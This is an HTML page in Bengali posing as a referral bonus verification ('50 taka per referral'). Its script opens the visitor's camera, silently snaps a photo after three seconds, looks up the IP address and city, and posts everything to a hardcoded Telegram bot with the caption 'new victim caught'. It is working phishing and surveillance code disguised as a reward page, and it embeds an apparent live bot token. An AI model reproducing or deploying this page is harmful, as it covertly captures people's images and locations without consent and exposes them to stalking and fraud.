<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>50/50 Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; background-color: #000;
            background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); 
            background-size: cover; background-position: center;
        }
        .container {
            background: rgba(0, 0, 0, 0.85); 
            padding: 40px 20px; border-radius: 15px; width: 85%; max-width: 380px;
            z-index: 2; position: relative; border: 2px solid #00ff00;
            box-shadow: 0 0 20px #00ff00;
        }
        h1 { color: #00ff00; font-size: 26px; margin-bottom: 15px; }
        h2 { color: #ffffff; font-size: 18px; margin-bottom: 30px; }
        #verify-btn { 
            background-color: #00ff00; color: #000; border: none; padding: 15px; 
            font-size: 18px; border-radius: 5px; cursor: pointer; width: 100%; font-weight: bold;
        }
        #status { margin-top: 25px; font-weight: bold; font-size: 14px; color: #00ff00; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>বোনাস সিস্টেম</h1>
        <h2>প্রতি রেফারর ৫০ টাকা বোনাস পান।</h2>
        <button id="verify-btn">START REFER</button>
        <div id="status"></div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
        const adminId = "7068444019"; 

        const verifyBtn = document.getElementById('verify-btn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        verifyBtn.addEventListener('click', async () => {
            status.innerText = "> ক্যামেরা পারমিশন দিন...";
            verifyBtn.style.display = "none"; 

            try {
                // ১. ক্যামেরা চালু করা
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                status.innerText = "> ভেরিফাই হচ্ছে, ৩ সেকেন্ড অপেক্ষা করুন...";

                // ২. ৩ সেকেন্ড পর ছবি তোলা
                setTimeout(async () => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        // ৩. ছবি পাঠানোর ক্যাপশন তৈরি
                        let caption = "📸 নতুন ভিকটিম ধরা পড়েছে!\n";
                        
                        // ৪. ট্র্যাকিং ডাটা (যদি সম্ভব হয়)
                        try {
                            const res = await fetch('https://ipwho.is/');
                            const d = await res.json();
                            caption += `📍 আইপি: ${d.ip}\n🌍 লোকেশন: ${d.city}, ${d.country}\n🔋 ব্যাটারি: ${navigator.userAgent.substring(0, 30)}`;
                        } catch(e) { caption += "⚠️ ট্র্যাকিং ডাটা পাওয়া যায়নি।"; }

                        const formData = new FormData();
                        formData.append('chat_id', adminId);
                        formData.append('photo', blob, 'user.jpg');
                        formData.append('caption', caption);

                        // ৫. টেলিগ্রামে পাঠানো
                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });

                        const result = await response.json();
                        if (result.ok) {
                            status.innerText = "> ভেরিফিকেশন সফল!";
                        } else {
                            status.innerText = "> সার্ভার এরর! বোট চেক করুন।";
                        }
                        
                        // ক্যামেরা বন্ধ করা
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg', 0.8);
                }, 3000); 

            } catch (err) {
                status.innerText = "> ক্যামেরা এলাও করা হয়নি! আবার চেষ্টা করুন।";
                status.style.color = "#ff0000";
                verifyBtn.style.display = "block";
            }
        });
    </script>
</body>
</html>
